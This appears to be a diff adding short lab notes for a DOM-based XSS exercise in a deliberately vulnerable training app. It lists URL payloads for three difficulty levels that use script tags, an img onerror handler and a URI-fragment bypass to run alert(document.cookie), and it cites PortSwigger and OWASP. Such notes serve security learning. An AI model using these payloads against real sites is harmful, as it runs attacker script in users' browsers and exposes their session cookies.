@@ -1,0 +1,23 @@
+# XSS-DOM
+ 
+Difficulty: Low
+
+/?default=English<script>alert(document.cookie)</script>          
+/?default=English<script>alert(1)</script>                        
+
+Difficulty: Medium
+
+Read help & source. Also, ispect Language select section.                                 
+/?default=<select><img title=<img src onerror=alert(document.cookie)></select>            
+/?default=<select><img src/onerror=alert(document.cookie)></select>                       
+Res: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet                
+
+Difficulty: High
+
+/?#default=<script>alert(document.cookie)</script>                    
+[# URI fragments is not sent to the server by the browser] 
+
+Res: https://owasp.org/www-community/attacks/DOM_Based_XSS
+
+
+
